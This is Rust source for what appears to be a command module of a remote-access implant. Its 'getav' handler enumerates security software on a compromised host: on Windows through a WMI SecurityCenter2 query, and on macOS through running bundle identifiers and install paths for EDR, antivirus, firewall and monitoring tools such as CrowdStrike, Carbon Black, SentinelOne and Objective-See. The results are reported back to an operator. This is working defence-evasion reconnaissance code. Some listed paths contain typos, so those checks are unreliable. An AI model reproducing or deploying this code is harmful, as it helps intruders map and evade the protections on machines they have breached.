use crate::internal::listener::{TaskHandler};
use serde::{Deserialize};

#[cfg(target_os = "macos")]
use std::rc::Rc;
#[cfg(target_os = "macos")]
use std::collections::HashMap;


pub static COMMAND: &str = "getav";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() != 0 {
            return Ok("Invalid number of arguments received. Usage: 'getav'.".to_string());
        }

        let products = get_av_products();

        if products.len() == 0 {
            return Ok("No AV products found.".to_string());
        }

        let mut output = format!("{} found:\n", products.len());

        for p in products {
            output.push_str(format!("[+] {}\n", p.display_name).as_str())
        }

        Ok(output)
    }
}

#[derive(Deserialize, Debug)]
#[serde(rename = "AntiVirusProduct")]
#[serde(rename_all = "PascalCase")]
struct AntiVirusProduct {
    display_name: String,
}

#[cfg(target_os = "windows")]
fn get_av_products() -> Vec<AntiVirusProduct> {
    let products: Vec<AntiVirusProduct> = Vec::new();

    let com_con = match wmi::COMLibrary::new() {
        Ok(c) => c,
        Err(_) => return products
    };

    let wmi_con = match wmi::WMIConnection::with_namespace_path("ROOT\\securitycenter2", com_con.into()) {
        Ok(w) => w,
        Err(_) => return products
    };

    let products: Vec<AntiVirusProduct> = wmi_con.raw_query("SELECT displayName FROM AntiVirusProduct").unwrap_or(products);

    return products;
}

#[cfg(target_os = "macos")]
fn get_av_products() -> Vec<Rc<AntiVirusProduct>> {
    use std::str;
    use objc::{msg_send, class, sel, sel_impl, runtime::Object};

    #[link(name = "Foundation", kind = "framework")]
    #[link(name = "CoreFoundation", kind = "framework")]
    #[link(name = "ApplicationServices", kind = "framework")]
    #[link(name = "AppKit", kind = "framework")]
    extern {}

    #[derive(PartialEq, Debug)]
    pub struct AppInfo {
        pid: i32,
        name: String
    }

    fn get_string(input: *mut Object) -> Option<String> {
        let input_utf8: *const i8 = unsafe { msg_send!(input, UTF8String) };

        if input_utf8 != std::ptr::null() {
            let output = unsafe { std::ffi::CStr::from_ptr(input_utf8).to_string_lossy().into_owned() };

            return Some(output)
        }

        return None;
    }

    let mut products: Vec<Rc<AntiVirusProduct>> = Vec::new();
    let list_of_apps = list_of_av_processes();

    unsafe {
        let autorelease_pool: *mut Object = msg_send![class!(NSAutoreleasePool), new];

        let shared_workspace: *mut Object = msg_send![class!(NSWorkspace), sharedWorkspace];
        let running_apps: *mut Object = msg_send![shared_workspace, runningApplications];

        let apps_count: i32 = msg_send![running_apps, count];


        for i in 0..apps_count {
            let app: *mut Object = msg_send![running_apps, objectAtIndex:i];

            let localized_name_obj: *mut Object = msg_send![app, bundleIdentifier];
            let app_name = get_string(localized_name_obj).unwrap_or("Unavailable".to_string());

            match list_of_apps.get(app_name.as_str()) {
                None => {}
                Some(app) => products.push(Rc::new(AntiVirusProduct { display_name: app.to_string() }))
            }
        }

        let _: () = msg_send![autorelease_pool, release];
    }

    for (key, value) in list_of_av_install_paths() {
        if std::path::Path::new(key.as_str()).exists() {
            products.push(Rc::new(AntiVirusProduct { display_name: value }))
        }
    }

    return products;
}

#[cfg(target_os = "macos")]
fn list_of_av_processes() -> HashMap<String, String> {
    let mut list_of_apps: HashMap<String, String> = HashMap::new();

    list_of_apps.insert("com.carbonblack.CbOsxSensorService".to_string(), "Carbon Black OSX Sensor".to_string());
    list_of_apps.insert("com.carbonblack.CbDefense".to_string(), "CB Defense A/V".to_string());
    list_of_apps.insert("ESET".to_string(), "ESET A/V".to_string());
    list_of_apps.insert("at.obdev.littlesnitch.agent".to_string(), "Littlesnitch firewall".to_string());
    list_of_apps.insert("xagt".to_string(), "FireEye HX Host Agent".to_string());
    list_of_apps.insert("falconctl".to_string(), "Crowdstrike Falcon Host Agent".to_string());
    list_of_apps.insert("OpenDNS".to_string(), "OpenDNS Client".to_string());
    list_of_apps.insert("SentinelOne".to_string(), "SentinelOne Host Agent".to_string());
    list_of_apps.insert("GlobalProtect".to_string(), "Global Protect PAN VPN client".to_string());
    list_of_apps.insert("HostChecker".to_string(), "Pulse VPN client".to_string());
    list_of_apps.insert("AMP-for-Endpoints".to_string(), "Cisco AMP for endpoints".to_string());
    list_of_apps.insert("lulu".to_string(), "Objective-See LuLu firewall".to_string());
    list_of_apps.insert("dnd".to_string(), "Objective-See Do Not Disturb".to_string());
    list_of_apps.insert("WhatsYourSign".to_string(), "Objective-See Whats Your Sign".to_string());
    list_of_apps.insert("KnockKnock".to_string(), "Objective-See Knock Knock".to_string());
    list_of_apps.insert("reikey".to_string(), "Objective-See ReiKey".to_string());
    list_of_apps.insert("OverSight".to_string(), "Objective-See OverSight".to_string());
    list_of_apps.insert("KextViewr".to_string(), "Objective-See KextViewr".to_string());
    list_of_apps.insert("blockblock".to_string(), "Objective-See BlockBlock".to_string());
    list_of_apps.insert("Netiquete".to_string(), "Objective-See Netiquette".to_string());
    list_of_apps.insert("processmonitor".to_string(), "Objective-See Process Monitor".to_string());
    list_of_apps.insert("filemonitor".to_string(), "Objective-See File Monitor".to_string());

    return list_of_apps;
}

#[cfg(target_os = "macos")]
fn list_of_av_install_paths() -> HashMap<String, String> {
    let mut install_paths: HashMap<String, String> = HashMap::new();

    install_paths.insert("/Applications/CarbonBlack/CbOsxSensorService".to_string(), "Carbon Black OSX Sensor".to_string());
    install_paths.insert("/Appllications/Confer.app".to_string(), "CB Defense A/V".to_string());
    install_paths.insert("Library/Application Support/com.eset.remoteadministrator.agent".to_string(), "ESET A/V".to_string());
    install_paths.insert("/Library/Little Snitch/".to_string(), "Littlesnitch firewall".to_string());
    install_paths.insert("/Library/FireEye/xagt".to_string(), "FireEye HX Host Agent".to_string());
    install_paths.insert("/Library/CS/falcond".to_string(), "Crowdstrike Falcon Host Agent".to_string());
    install_paths.insert("/Library/Application Support/OpenDNS Roaming Client/dns-updater".to_string(), "OpenDNS Client".to_string());
    install_paths.insert("/Library/Logs/PaloAltoNetworks/GlobalProtect".to_string(), "Global Protect PAN VPN client".to_string());
    install_paths.insert("/Applications/Pulse Secure.app".to_string(), "Pulse VPN client".to_string());
    install_paths.insert("/opt/cisco/amp".to_string(), "Cisco AMP for endpoints".to_string());
    install_paths.insert("/usr/local/bin/jamf".to_string(), "JAMF agent".to_string());
    install_paths.insert("/usr/local/jamf".to_string(), "JAMF agent".to_string());
    install_paths.insert("/Library/Application Support/Malwarebytes".to_string(), "Malwarebytes A/V".to_string());
    install_paths.insert("/usr/local/bin/osqueryi".to_string(), "osquery".to_string());
    install_paths.insert("/Library/Sophos Anti-Virus/".to_string(), "Sophos antivirus".to_string());
    install_paths.insert("/Library/Objective-See/Lulu".to_string(), "Objective-See LuLu firewall".to_string());
    install_paths.insert("/Applications/LuLu.app".to_string(), "Objective-See LuLu firewall".to_string());
    install_paths.insert("/Library/Objective-See/DND".to_string(), "Objective-See Do Not Disturb".to_string());
    install_paths.insert("/Applications/Do Not Disturb.app/".to_string(), "Objective-See Do Not Disturb".to_string());
    install_paths.insert("/Applications/WhatsYourSign.app".to_string(), "Objective-See Whats Your Sign".to_string());
    install_paths.insert("/Applications/KnockKnock.app:".to_string(), "Objective-See Knock Knock".to_string());
    install_paths.insert("/Applications/ReiKey.app".to_string(), "Objective-See ReiKey".to_string());
    install_paths.insert("/Applications/OverSight.app".to_string(), "Objective-See OverSight".to_string());
    install_paths.insert("/Applications/KextViewr.app".to_string(), "Objective-See KextViewr".to_string());
    install_paths.insert("/Applications/BlockBlock Helper.app".to_string(), "Objective-See BlockBlock".to_string());
    install_paths.insert("/Applications/Netiquette.app".to_string(), "Objective-See Netiquette".to_string());
    install_paths.insert("/Applications/ProcessMonitor.app".to_string(), "Objective-See Process Monitor".to_string());
    install_paths.insert("/Applications/FileMonitor.app".to_string(), "Objective-See File Monitor".to_string());

    return install_paths;
}


